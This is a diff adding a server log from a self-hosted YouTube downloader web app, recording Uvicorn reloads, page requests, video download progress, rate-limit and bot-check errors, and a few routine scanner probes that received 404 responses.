@@ -1,0 +1,348 @@
+INFO:     Will watch for changes in these directories: ['/home/cybernest/Projects/youtube_downloader']
+INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+INFO:     Started reloader process [273930] using WatchFiles
+INFO:     Started server process [273935]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     2.187.186.65:58768 - "GET /docs HTTP/1.1" 200 OK
+INFO:     2.187.186.65:58768 - "GET /openapi.json HTTP/1.1" 200 OK
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [273935]
+INFO:     Started server process [275868]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [275868]
+INFO:     Started server process [275873]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [275873]
+INFO:     Started server process [275884]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [275884]
+INFO:     Started server process [275892]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [275892]
+INFO:     Started server process [275898]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     2.187.186.65:36128 - "GET / HTTP/1.1" 200 OK
+INFO:     2.187.186.65:36128 - "GET /static/styles.css HTTP/1.1" 200 OK
+INFO:     2.187.186.65:36128 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     2.187.186.65:44578 - "GET / HTTP/1.1" 200 OK
+INFO:     2.187.186.65:44578 - "GET /static/styles.css HTTP/1.1" 200 OK
+INFO:     2.187.186.65:34052 - "GET / HTTP/1.1" 200 OK
+INFO:     2.187.186.65:34052 - "GET /static/styles.css HTTP/1.1" 304 Not Modified
+INFO:     2.187.186.65:48652 - "GET / HTTP/1.1" 200 OK
+INFO:     2.187.186.65:48652 - "GET /static/styles.css HTTP/1.1" 304 Not Modified
+INFO:     2.187.186.65:48658 - "GET / HTTP/1.1" 200 OK
+INFO:     2.187.186.65:48658 - "GET /static/styles.css HTTP/1.1" 304 Not Modified
+INFO:     2.187.186.65:46580 - "GET / HTTP/1.1" 200 OK
+INFO:     2.187.186.65:46580 - "GET /static/styles.css HTTP/1.1" 304 Not Modified
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [275898]
+INFO:     Started server process [275999]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [275999]
+INFO:     Started server process [276004]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [276004]
+INFO:     Started server process [276020]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [276020]
+INFO:     Started server process [276025]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [276025]
+INFO:     Started server process [276031]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [276031]
+INFO:     Started server process [276036]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Will watch for changes in these directories: ['/home/cybernest/Projects/youtube_downloader']
+WARNING:  "workers" flag is ignored when reloading is enabled.
+INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+INFO:     Started reloader process [280059] using WatchFiles
+INFO:     Started server process [280064]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  Invalid HTTP request received.
+INFO:     165.154.164.57:49292 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.164.57:41800 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     165.154.164.57:41812 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     165.154.164.57:41818 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     165.154.164.57:41828 - "GET /config.json HTTP/1.1" 404 Not Found
+WARNING:  WatchFiles detected changes in 'controller.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [280064]
+INFO:     Started server process [280294]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Will watch for changes in these directories: ['/home/cybernest/Projects/youtube_downloader']
+WARNING:  "workers" flag is ignored when reloading is enabled.
+INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+INFO:     Started reloader process [5483] using WatchFiles
+INFO:     Started server process [5499]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     2.187.186.65:51158 - "GET / HTTP/1.1" 200 OK
+INFO:     2.187.186.65:51158 - "GET /static/styles.css HTTP/1.1" 200 OK
+INFO:     2.187.186.65:51158 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING: [youtube] Failed to download m3u8 information: HTTP Error 429: Too Many Requests
+[download]   0.0% of   13.91MiB at  192.47KiB/s ETA 01:14Processing URL: https://youtu.be/SSDjvY7JI40?si=BbmVMcB3xVtkaC1K
+[download]   0.0% of   13.91MiB at  393.34KiB/s ETA 00:36[download]   0.0% of   13.91MiB at  732.72KiB/s ETA 00:19[download]   0.1% of   13.91MiB at    1.42MiB/s ETA 00:09[download]   0.2% of   13.91MiB at    2.75MiB/s ETA 00:05[download]   0.4% of   13.91MiB at    5.21MiB/s ETA 00:02[download]   0.9% of   13.91MiB at    8.61MiB/s ETA 00:01[download]   1.8% of   13.91MiB at   12.82MiB/s ETA 00:01[download]   3.6% of   13.91MiB at   18.99MiB/s ETA 00:00[download]   7.2% of   13.91MiB at   30.69MiB/s ETA 00:00[download]  14.4% of   13.91MiB at   51.55MiB/s ETA 00:00[download]  28.8% of   13.91MiB at   77.68MiB/s ETA 00:00[download]  57.5% of   13.91MiB at  115.51MiB/s ETA 00:00[download]  68.8% of   13.91MiB at  127.23MiB/s ETA 00:00[download]  68.8% of   13.91MiB at  Unknown B/s ETA Unknown[download]  68.8% of   13.91MiB at    1.65MiB/s ETA 00:02  [download]  68.8% of   13.91MiB at    2.33MiB/s ETA 00:01[download]  68.9% of   13.91MiB at    3.85MiB/s ETA 00:01[download]  69.0% of   13.91MiB at    6.47MiB/s ETA 00:00[download]  69.2% of   13.91MiB at   10.95MiB/s ETA 00:00[download]  69.7% of   13.91MiB at   18.49MiB/s ETA 00:00[download]  70.6% of   13.91MiB at   31.72MiB/s ETA 00:00[download]  72.4% of   13.91MiB at   53.29MiB/s ETA 00:00[download]  76.0% of   13.91MiB at   85.42MiB/s ETA 00:00[download]  83.2% of   13.91MiB at  121.52MiB/s ETA 00:00[download]  97.5% of   13.91MiB at  163.88MiB/s ETA 00:00[download] 100.0% of   13.91MiB at  158.11MiB/s ETA 00:00[download] 100% of   13.91MiB in 00:00:00 at 86.48MiB/s                                                         [download]   0.0% of    5.13MiB at  Unknown B/s ETA Unknown[download]   0.1% of    5.13MiB at    1.96MiB/s ETA 00:02  [download]   0.1% of    5.13MiB at    3.09MiB/s ETA 00:01[download]   0.3% of    5.13MiB at    4.92MiB/s ETA 00:01[download]   0.6% of    5.13MiB at    7.89MiB/s ETA 00:00[download]   1.2% of    5.13MiB at   13.14MiB/s ETA 00:00[download]   2.4% of    5.13MiB at   22.13MiB/s ETA 00:00[download]   4.9% of    5.13MiB at   37.42MiB/s ETA 00:00[download]   9.7% of    5.13MiB at   61.67MiB/s ETA 00:00[download]  19.5% of    5.13MiB at   98.23MiB/s ETA 00:00[download]  39.0% of    5.13MiB at  139.86MiB/s ETA 00:00[download]  78.0% of    5.13MiB at  179.47MiB/s ETA 00:00[download] 100.0% of    5.13MiB at  187.20MiB/s ETA 00:00[download] 100% of    5.13MiB in 00:00:00 at 119.31MiB/s                                                         response: Download Complete !!!
+INFO:     2.187.186.65:51168 - "POST /submit-form HTTP/1.1" 200 OK
+INFO:     51.159.185.161:44752 - "GET / HTTP/1.1" 200 OK
+INFO:     51.159.185.161:44752 - "GET /static/styles.css HTTP/1.1" 200 OK
+INFO:     51.159.185.161:44752 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     5.114.222.50:56540 - "GET / HTTP/1.1" 200 OK
+INFO:     5.114.222.50:56540 - "GET /static/styles.css HTTP/1.1" 304 Not Modified
+INFO:     5.114.222.50:56540 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     5.114.222.50:56541 - "GET / HTTP/1.1" 200 OK
+INFO:     5.114.163.120:56580 - "GET / HTTP/1.1" 200 OK
+INFO:     5.114.163.120:56580 - "GET /static/styles.css HTTP/1.1" 304 Not Modified
+INFO:     5.114.163.120:56580 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING: [youtube] Failed to download m3u8 information: HTTP Error 429: Too Many Requests
+[download]   0.0% of    4.95MiB at  781.94KiB/s ETA 00:06Processing URL: https://youtu.be/x90sm_J0APU?si=9LgTCiEeTUrUYnAN
+[download]   0.1% of    4.95MiB at    1.25MiB/s ETA 00:03[download]   0.1% of    4.95MiB at    2.22MiB/s ETA 00:02[download]   0.3% of    4.95MiB at    3.66MiB/s ETA 00:01[download]   0.6% of    4.95MiB at    4.90MiB/s ETA 00:01[download]   1.2% of    4.95MiB at    5.89MiB/s ETA 00:00[download]   2.5% of    4.95MiB at    7.91MiB/s ETA 00:00[download]   5.0% of    4.95MiB at   12.29MiB/s ETA 00:00[download]  10.1% of    4.95MiB at   18.77MiB/s ETA 00:00[download]  20.2% of    4.95MiB at   29.17MiB/s ETA 00:00[download]  40.4% of    4.95MiB at   45.80MiB/s ETA 00:00[download]  80.8% of    4.95MiB at   74.53MiB/s ETA 00:00[download] 100.0% of    4.95MiB at   84.93MiB/s ETA 00:00[download] 100% of    4.95MiB in 00:00:00 at 57.92MiB/s                                                         [download]   0.0% of    5.35MiB at  Unknown B/s ETA 00:05[download]   0.1% of    5.35MiB at    1.25MiB/s ETA 00:04[download]   0.1% of    5.35MiB at    1.83MiB/s ETA 00:02[download]   0.3% of    5.35MiB at    2.78MiB/s ETA 00:01[download]   0.6% of    5.35MiB at    4.48MiB/s ETA 00:01[download]   1.1% of    5.35MiB at    7.48MiB/s ETA 00:00[download]   2.3% of    5.35MiB at   12.84MiB/s ETA 00:00[download]   4.7% of    5.35MiB at   21.29MiB/s ETA 00:00[download]   9.3% of    5.35MiB at   35.91MiB/s ETA 00:00[download]  18.7% of    5.35MiB at   58.09MiB/s ETA 00:00[download]  37.4% of    5.35MiB at   92.09MiB/s ETA 00:00[download]  74.7% of    5.35MiB at  134.10MiB/s ETA 00:00[download] 100.0% of    5.35MiB at  152.27MiB/s ETA 00:00[download] 100% of    5.35MiB in 00:00:00 at 107.03MiB/s                                                         response: Download Complete !!!
+INFO:     5.114.163.120:56581 - "POST /submit-form HTTP/1.1" 200 OK
+WARNING: [youtube] Failed to download m3u8 information: HTTP Error 429: Too Many Requests
+[download]   0.0% of    4.95MiB at  939.58KiB/s ETA 00:05Processing URL: https://youtu.be/x90sm_J0APU?si=9LgTCiEeTUrUYnAN
+[download]   0.1% of    4.95MiB at    1.10MiB/s ETA 00:04[download]   0.1% of    4.95MiB at    1.74MiB/s ETA 00:02[download]   0.3% of    4.95MiB at    2.83MiB/s ETA 00:01[download]   0.6% of    4.95MiB at    4.66MiB/s ETA 00:01[download]   1.2% of    4.95MiB at    5.68MiB/s ETA 00:00[download]   2.5% of    4.95MiB at    6.35MiB/s ETA 00:00[download]   5.0% of    4.95MiB at   11.46MiB/s ETA 00:00[download]  10.1% of    4.95MiB at   18.46MiB/s ETA 00:00[download]  20.2% of    4.95MiB at   28.86MiB/s ETA 00:00[download]  40.4% of    4.95MiB at   47.54MiB/s ETA 00:00[download]  80.8% of    4.95MiB at   75.33MiB/s ETA 00:00[download] 100.0% of    4.95MiB at   83.40MiB/s ETA 00:00[download] 100% of    4.95MiB in 00:00:00 at 57.01MiB/s                                                         [download]   0.0% of    5.35MiB at  Unknown B/s ETA Unknown[download]   0.1% of    5.35MiB at  Unknown B/s ETA Unknown[download]   0.1% of    5.35MiB at    4.48MiB/s ETA 00:01  [download]   0.3% of    5.35MiB at    7.27MiB/s ETA 00:00[download]   0.6% of    5.35MiB at   11.59MiB/s ETA 00:00[download]   1.1% of    5.35MiB at   19.57MiB/s ETA 00:00[download]   2.3% of    5.35MiB at   33.13MiB/s ETA 00:00[download]   4.7% of    5.35MiB at   53.13MiB/s ETA 00:00[download]   9.3% of    5.35MiB at   80.99MiB/s ETA 00:00[download]  18.7% of    5.35MiB at  118.88MiB/s ETA 00:00[download]  37.4% of    5.35MiB at  159.14MiB/s ETA 00:00[download]  74.7% of    5.35MiB at  213.66MiB/s ETA 00:00[download] 100.0% of    5.35MiB at  229.01MiB/s ETA 00:00[download] 100% of    5.35MiB in 00:00:00 at 138.75MiB/s                                                         response: Download Complete !!!
+INFO:     51.159.185.161:34646 - "POST /submit-form HTTP/1.1" 200 OK
+ERROR: [youtube] 4fdkVKYbLfA: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+Processing URL: https://music.youtube.com/watch?v=4fdkVKYbLfA&si=JOFnFKibRoOWdJ3O
+response: ERROR: [youtube] 4fdkVKYbLfA: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+INFO:     51.159.185.161:59752 - "POST /submit-form HTTP/1.1" 400 Bad Request
+[download]   0.0% of   25.27MiB at  860.19KiB/s ETA 00:30Processing URL: https://youtu.be/iqmjF12J5UQ?si=KLNBeg6CQiZ5cL-3
+[download]   0.0% of   25.27MiB at    1.23MiB/s ETA 00:20[download]   0.0% of   25.27MiB at    1.97MiB/s ETA 00:12[download]   0.1% of   25.27MiB at    3.31MiB/s ETA 00:07[download]   0.1% of   25.27MiB at    5.48MiB/s ETA 00:04[download]   0.2% of   25.27MiB at    6.76MiB/s ETA 00:03[download]   0.5% of   25.27MiB at    8.31MiB/s ETA 00:03[download]   1.0% of   25.27MiB at   11.98MiB/s ETA 00:02[download]   2.0% of   25.27MiB at   18.54MiB/s ETA 00:01[download]   4.0% of   25.27MiB at   29.94MiB/s ETA 00:00[download]   7.9% of   25.27MiB at   46.94MiB/s ETA 00:00[download]  15.8% of   25.27MiB at   74.13MiB/s ETA 00:00[download]  31.7% of   25.27MiB at  108.13MiB/s ETA 00:00[download]  38.0% of   25.27MiB at  120.58MiB/s ETA 00:00[download]  38.0% of   25.27MiB at  555.17KiB/s ETA 00:29[download]  38.0% of   25.27MiB at  902.45KiB/s ETA 00:17[download]  38.0% of   25.27MiB at    1.52MiB/s ETA 00:10[download]  38.0% of   25.27MiB at    2.41MiB/s ETA 00:06[download]  38.1% of   25.27MiB at    2.91MiB/s ETA 00:05[download]  38.2% of   25.27MiB at    4.93MiB/s ETA 00:03[download]  38.4% of   25.27MiB at    8.29MiB/s ETA 00:01[download]  38.9% of   25.27MiB at   14.53MiB/s ETA 00:01[download]  39.9% of   25.27MiB at   25.20MiB/s ETA 00:00[download]  41.9% of   25.27MiB at   41.56MiB/s ETA 00:00[download]  45.9% of   25.27MiB at   67.93MiB/s ETA 00:00[download]  53.8% of   25.27MiB at  109.08MiB/s ETA 00:00[download]  69.6% of   25.27MiB at  150.08MiB/s ETA 00:00[download]  77.4% of   25.27MiB at  164.21MiB/s ETA 00:00[download]  77.4% of   25.27MiB at  Unknown B/s ETA Unknown[download]  77.4% of   25.27MiB at    2.44MiB/s ETA 00:02  [download]  77.4% of   25.27MiB at    3.56MiB/s ETA 00:01[download]  77.5% of   25.27MiB at    5.55MiB/s ETA 00:01[download]  77.5% of   25.27MiB at    8.72MiB/s ETA 00:00[download]  77.7% of   25.27MiB at   14.77MiB/s ETA 00:00[download]  77.9% of   25.27MiB at   24.19MiB/s ETA 00:00[download]  78.4% of   25.27MiB at   38.54MiB/s ETA 00:00[download]  79.4% of   25.27MiB at   62.21MiB/s ETA 00:00[download]  81.4% of   25.27MiB at   92.63MiB/s ETA 00:00[download]  85.3% of   25.27MiB at  126.75MiB/s ETA 00:00[download]  93.2% of   25.27MiB at  183.44MiB/s ETA 00:00[download] 100.0% of   25.27MiB at  205.99MiB/s ETA 00:00[download] 100% of   25.27MiB in 00:00:00 at 99.62MiB/s                                                         [download]   0.1% of    1.30MiB at  Unknown B/s ETA Unknown[download]   0.2% of    1.30MiB at    2.29MiB/s ETA 00:00  [download]   0.5% of    1.30MiB at    3.50MiB/s ETA 00:00[download]   1.1% of    1.30MiB at    6.01MiB/s ETA 00:00[download]   2.3% of    1.30MiB at   10.31MiB/s ETA 00:00[download]   4.7% of    1.30MiB at   17.74MiB/s ETA 00:00[download]   9.6% of    1.30MiB at   30.02MiB/s ETA 00:00[download]  19.2% of    1.30MiB at   49.91MiB/s ETA 00:00[download]  38.5% of    1.30MiB at   79.01MiB/s ETA 00:00[download]  77.0% of    1.30MiB at  122.56MiB/s ETA 00:00[download] 100.0% of    1.30MiB at  134.95MiB/s ETA 00:00[download] 100% of    1.30MiB in 00:00:00 at 59.29MiB/s                                                         response: Download Complete !!!
+INFO:     51.159.185.161:54528 - "POST /submit-form HTTP/1.1" 200 OK
+[download]   0.0% of    4.95MiB at  202.80KiB/s ETA 00:25Processing URL: https://youtu.be/x90sm_J0APU?si=9LgTCiEeTUrUYnAN
+[download]   0.1% of    4.95MiB at  511.77KiB/s ETA 00:09[download]   0.1% of    4.95MiB at    1.05MiB/s ETA 00:04[download]   0.3% of    4.95MiB at    2.03MiB/s ETA 00:02[download]   0.6% of    4.95MiB at    3.80MiB/s ETA 00:01[download]   1.2% of    4.95MiB at    6.43MiB/s ETA 00:00[download]   2.5% of    4.95MiB at    8.36MiB/s ETA 00:00[download]   5.0% of    4.95MiB at   12.68MiB/s ETA 00:00[download]  10.1% of    4.95MiB at   19.83MiB/s ETA 00:00[download]  20.2% of    4.95MiB at   31.44MiB/s ETA 00:00[download]  40.4% of    4.95MiB at   50.16MiB/s ETA 00:00[download]  80.8% of    4.95MiB at   75.86MiB/s ETA 00:00[download] 100.0% of    4.95MiB at   84.57MiB/s ETA 00:00[download] 100% of    4.95MiB in 00:00:00 at 53.03MiB/s                                                         [download]   0.0% of    5.35MiB at  Unknown B/s ETA Unknown[download]   0.1% of    5.35MiB at    2.25MiB/s ETA 00:02  [download]   0.1% of    5.35MiB at    3.56MiB/s ETA 00:01[download]   0.3% of    5.35MiB at    5.54MiB/s ETA 00:00[download]   0.6% of    5.35MiB at    8.63MiB/s ETA 00:00[download]   1.1% of    5.35MiB at   14.21MiB/s ETA 00:00[download]   2.3% of    5.35MiB at   24.34MiB/s ETA 00:00[download]   4.7% of    5.35MiB at   40.78MiB/s ETA 00:00[download]   9.3% of    5.35MiB at   62.10MiB/s ETA 00:00[download]  18.7% of    5.35MiB at   96.15MiB/s ETA 00:00[download]  37.4% of    5.35MiB at  143.80MiB/s ETA 00:00[download]  74.7% of    5.35MiB at  183.61MiB/s ETA 00:00[download] 100.0% of    5.35MiB at  195.56MiB/s ETA 00:00[download] 100% of    5.35MiB in 00:00:00 at 118.59MiB/s                                                         response: Download Complete !!!
+INFO:     5.114.222.50:57260 - "POST /submit-form HTTP/1.1" 200 OK
+ERROR: [youtube] x90sm_J0APU: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+Processing URL: https://youtu.be/x90sm_J0APU?si=9LgTCiEeTUrUYnAN
+response: ERROR: [youtube] x90sm_J0APU: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+INFO:     5.114.222.50:57263 - "POST /submit-form HTTP/1.1" 400 Bad Request
+WARNING: [youtube] Failed to download m3u8 information: HTTP Error 429: Too Many Requests
+[download]   0.0% of    4.95MiB at  949.37KiB/s ETA 00:05Processing URL: https://youtu.be/x90sm_J0APU?si=9LgTCiEeTUrUYnAN
+[download]   0.1% of    4.95MiB at    1.18MiB/s ETA 00:04[download]   0.1% of    4.95MiB at    1.95MiB/s ETA 00:02[download]   0.3% of    4.95MiB at    2.89MiB/s ETA 00:01[download]   0.6% of    4.95MiB at    4.74MiB/s ETA 00:01[download]   1.2% of    4.95MiB at    7.00MiB/s ETA 00:00[download]   2.5% of    4.95MiB at    9.04MiB/s ETA 00:00[download]   5.0% of    4.95MiB at   13.21MiB/s ETA 00:00[download]  10.1% of    4.95MiB at   18.39MiB/s ETA 00:00[download]  20.2% of    4.95MiB at   30.74MiB/s ETA 00:00[download]  40.4% of    4.95MiB at   44.89MiB/s ETA 00:00[download]  80.8% of    4.95MiB at   70.11MiB/s ETA 00:00[download] 100.0% of    4.95MiB at   77.97MiB/s ETA 00:00[download] 100% of    4.95MiB in 00:00:00 at 50.66MiB/s                                                         [download]   0.0% of    5.35MiB at  Unknown B/s ETA Unknown[download]   0.1% of    5.35MiB at    2.03MiB/s ETA 00:02  [download]   0.1% of    5.35MiB at    3.11MiB/s ETA 00:01[download]   0.3% of    5.35MiB at    4.42MiB/s ETA 00:01[download]   0.6% of    5.35MiB at    7.55MiB/s ETA 00:00[download]   1.1% of    5.35MiB at   12.95MiB/s ETA 00:00[download]   2.3% of    5.35MiB at   22.00MiB/s ETA 00:00[download]   4.7% of    5.35MiB at   36.96MiB/s ETA 00:00[download]   9.3% of    5.35MiB at   60.05MiB/s ETA 00:00[download]  18.7% of    5.35MiB at   93.54MiB/s ETA 00:00[download]  37.4% of    5.35MiB at  126.50MiB/s ETA 00:00[download]  74.7% of    5.35MiB at  177.23MiB/s ETA 00:00[download] 100.0% of    5.35MiB at  191.47MiB/s ETA 00:00[download] 100% of    5.35MiB in 00:00:00 at 117.15MiB/s                                                         response: Download Complete !!!
+INFO:     5.114.222.50:57262 - "POST /submit-form HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     152.32.235.90:54128 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.235.90:54136 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     152.32.235.90:54140 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     152.32.235.90:54152 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     152.32.235.90:54162 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     87.236.176.225:36287 - "GET / HTTP/1.1" 200 OK
+INFO:     2.187.186.65:52200 - "GET / HTTP/1.1" 200 OK
+ERROR: [youtube] 9alSTN-_Ph4: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+Processing URL: https://youtu.be/9alSTN-_Ph4?si=DQhYUMT5ydaaQ0nT
+response: ERROR: [youtube] 9alSTN-_Ph4: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+INFO:     2.187.186.65:52202 - "POST /submit-form HTTP/1.1" 400 Bad Request
+ERROR: [youtube] 9alSTN-_Ph4: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+Processing URL: https://youtu.be/9alSTN-_Ph4?si=DQhYUMT5ydaaQ0nT
+response: ERROR: [youtube] 9alSTN-_Ph4: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+INFO:     2.187.186.65:52202 - "POST /submit-form HTTP/1.1" 400 Bad Request
+ERROR: [youtube] nXgsTObHfHw: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+Processing URL: https://youtu.be/nXgsTObHfHw?si=GK8pAuEy7UIfLo54
+response: ERROR: [youtube] nXgsTObHfHw: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+INFO:     2.187.186.65:35960 - "POST /submit-form HTTP/1.1" 400 Bad Request
+WARNING: [youtube] Failed to download m3u8 information: HTTP Error 429: Too Many Requests
+[download]   0.0% of   80.24MiB at  Unknown B/s ETA 01:22Processing URL: https://youtu.be/nXgsTObHfHw?si=GK8pAuEy7UIfLo54
+[download]   0.0% of   80.24MiB at    1.31MiB/s ETA 01:01[download]   0.0% of   80.24MiB at    2.28MiB/s ETA 00:35[download]   0.0% of   80.24MiB at    3.85MiB/s ETA 00:20[download]   0.0% of   80.24MiB at    5.34MiB/s ETA 00:15[download]   0.1% of   80.24MiB at    6.17MiB/s ETA 00:13[download]   0.2% of   80.24MiB at    8.76MiB/s ETA 00:09[download]   0.3% of   80.24MiB at   12.90MiB/s ETA 00:06[download]   0.6% of   80.24MiB at   19.56MiB/s ETA 00:04[download]   1.2% of   80.24MiB at   30.88MiB/s ETA 00:02[download]   2.5% of   80.24MiB at   47.79MiB/s ETA 00:01[download]   5.0% of   80.24MiB at   79.03MiB/s ETA 00:00[download]  10.0% of   80.24MiB at  113.38MiB/s ETA 00:00[download]  12.0% of   80.24MiB at  125.41MiB/s ETA 00:00[download]  12.0% of   80.24MiB at  Unknown B/s ETA Unknown[download]  12.0% of   80.24MiB at  Unknown B/s ETA Unknown[download]  12.0% of   80.24MiB at    5.74MiB/s ETA 00:12  [download]  12.0% of   80.24MiB at    8.44MiB/s ETA 00:08[download]  12.1% of   80.24MiB at   13.11MiB/s ETA 00:05[download]  12.1% of   80.24MiB at   21.22MiB/s ETA 00:03[download]  12.2% of   80.24MiB at   32.93MiB/s ETA 00:02[download]  12.3% of   80.24MiB at   52.97MiB/s ETA 00:01[download]  12.6% of   80.24MiB at   82.78MiB/s ETA 00:00[download]  13.3% of   80.24MiB at  122.71MiB/s ETA 00:00[download]  14.5% of   80.24MiB at  166.51MiB/s ETA 00:00[download]  17.0% of   80.24MiB at  215.33MiB/s ETA 00:00[download]  22.0% of   80.24MiB at  192.76MiB/s ETA 00:00[download]  24.4% of   80.24MiB at  197.90MiB/s ETA 00:00[download]  24.4% of   80.24MiB at  Unknown B/s ETA Unknown[download]  24.4% of   80.24MiB at    2.56MiB/s ETA 00:23  [download]  24.4% of   80.24MiB at    4.08MiB/s ETA 00:14[download]  24.5% of   80.24MiB at    6.63MiB/s ETA 00:09[download]  24.5% of   80.24MiB at   10.88MiB/s ETA 00:05[download]  24.5% of   80.24MiB at   17.88MiB/s ETA 00:03[download]  24.6% of   80.24MiB at   29.44MiB/s ETA 00:02[download]  24.7% of   80.24MiB at   47.35MiB/s ETA 00:01[download]  25.1% of   80.24MiB at   75.02MiB/s ETA 00:00[download]  25.7% of   80.24MiB at  112.77MiB/s ETA 00:00[download]  26.9% of   80.24MiB at  158.61MiB/s ETA 00:00[download]  29.4% of   80.24MiB at  204.53MiB/s ETA 00:00[download]  34.4% of   80.24MiB at  221.17MiB/s ETA 00:00[download]  36.6% of   80.24MiB at  228.11MiB/s ETA 00:00[download]  36.6% of   80.24MiB at  Unknown B/s ETA Unknown[download]  36.6% of   80.24MiB at    2.77MiB/s ETA 00:18  [download]  36.6% of   80.24MiB at    2.92MiB/s ETA 00:17[download]  36.7% of   80.24MiB at    4.91MiB/s ETA 00:10[download]  36.7% of   80.24MiB at    8.12MiB/s ETA 00:06[download]  36.7% of   80.24MiB at   13.02MiB/s ETA 00:03[download]  36.8% of   80.24MiB at   21.29MiB/s ETA 00:02[download]  36.9% of   80.24MiB at   34.56MiB/s ETA 00:01[download]  37.3% of   80.24MiB at   55.80MiB/s ETA 00:00[download]  37.9% of   80.24MiB at   89.55MiB/s ETA 00:00[download]  39.1% of   80.24MiB at  138.63MiB/s ETA 00:00[download]  41.6% of   80.24MiB at  189.79MiB/s ETA 00:00[download]  46.6% of   80.24MiB at  218.71MiB/s ETA 00:00[download]  49.1% of   80.24MiB at  232.05MiB/s ETA 00:00[download]  49.1% of   80.24MiB at  Unknown B/s ETA Unknown[download]  49.1% of   80.24MiB at  Unknown B/s ETA Unknown[download]  49.1% of   80.24MiB at    6.13MiB/s ETA 00:06  [download]  49.1% of   80.24MiB at    8.39MiB/s ETA 00:04[download]  49.1% of   80.24MiB at   13.74MiB/s ETA 00:02[download]  49.1% of   80.24MiB at   22.99MiB/s ETA 00:01[download]  49.2% of   80.24MiB at   38.57MiB/s ETA 00:01[download]  49.4% of   80.24MiB at   63.61MiB/s ETA 00:00[download]  49.7% of   80.24MiB at   98.04MiB/s ETA 00:00[download]  50.3% of   80.24MiB at  147.06MiB/s ETA 00:00[download]  51.5% of   80.24MiB at  196.54MiB/s ETA 00:00[download]  54.0% of   80.24MiB at  249.21MiB/s ETA 00:00[download]  59.0% of   80.24MiB at  215.35MiB/s ETA 00:00[download]  61.2% of   80.24MiB at  218.08MiB/s ETA 00:00[download]  61.2% of   80.24MiB at  Unknown B/s ETA Unknown[download]  61.2% of   80.24MiB at    2.92MiB/s ETA 00:10  [download]  61.2% of   80.24MiB at    4.08MiB/s ETA 